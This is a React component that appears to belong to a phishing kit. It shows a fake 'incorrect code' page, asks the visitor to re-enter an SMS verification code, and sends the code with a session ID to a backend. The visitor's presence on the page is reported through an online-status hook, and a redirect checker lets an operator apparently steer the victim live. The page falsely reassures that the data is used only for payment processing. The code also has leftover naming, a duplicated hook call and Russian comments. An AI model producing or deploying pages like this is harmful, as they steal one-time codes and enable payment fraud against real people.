import React, { useState } from "react";
import styles from "./WrongSms.module.css";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import Loading from "../../components/Loading/Loading";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const WrongSms: React.FC = () => {
  const sessionId = localStorage.getItem("currentSessionId");

  useRedirectChecker(3000);
  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "wrong-sms",
    enabled: true,
  });

  const [sms, setSms] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!sms || isNaN(Number(sms)) || Number(sms) <= 0) {
      setError("Please enter a valid code");
      return;
    }

    setIsLoading(true);
    setError("");

    try {
      if (!sessionId) {
        setIsLoading(false);
        return;
      }

      const response = await fetch("/api/submit-sms", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          sessionId,
          sms: sms,
        }),
      });

      const result = await response.json();

      if (!result.success) {
        // Можно показать сообщение об успехе или перенаправить куда-то
        alert("Sms isn't sent!");
        // navigate('/success'); // или куда нужно
      }
    } catch (error) {
      console.error("Error submitting balance:", error);
      setError("Ошибка сети. Попробуйте еще раз.");
    }
  };

  const formatBalance = (value: string) => {
    // Убираем все нечисловые символы кроме точки
    const cleaned = value.replace(/[^\d.]/g, "");

    // Проверяем, что есть только одна точка
    const parts = cleaned.split(".");
    if (parts.length > 2) {
      return parts[0] + "." + parts.slice(1).join("");
    }

    return cleaned;
  };

  const handleBalanceChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatBalance(e.target.value);
    setSms(formatted);
    setError("");
  };

  return (
    <div className={styles["balance-page"]}>
      <div className={styles["balance-container"]}>
        <div className={styles["balance-header"]}>
          <h1>You entered an incorrect code</h1>
          <p>Please enter a new code</p>
        </div>

        <form onSubmit={handleSubmit} className={styles["balance-form"]}>
          <div className={styles["input-group"]}>
            <label htmlFor="balance">SMS Code</label>
            <div className={styles["input-wrapper"]}>
              <input
                type="text"
                id="balance"
                value={sms}
                onChange={handleBalanceChange}
                className={error ? styles["error"] : ""}
                disabled={isLoading}
              />
            </div>
            {error && <span className={styles["error-message"]}>{error}</span>}
          </div>

          <button
            type="submit"
            className={`${styles["submit-button"]} ${
              isLoading ? styles["loading"] : ""
            }`}
            disabled={isLoading || !sms}
          >
            {isLoading ? (
              <div className={styles["loading-spinner"]}>
                <div className={styles["spinner"]}></div>
                Processing...
              </div>
            ) : (
              "Send code"
            )}
          </button>
        </form>

        <div className={styles["security-notice"]}>
          <div className={styles["security-icon"]}>🔒</div>
          <div className={styles["security-text"]}>
            <strong>Data Security</strong>
            <p>
              Your data is protected and is used only for payment processing.
            </p>
          </div>
        </div>
      </div>
      <Loading isLoading={isLoading} />
    </div>
  );
};

export default WrongSms;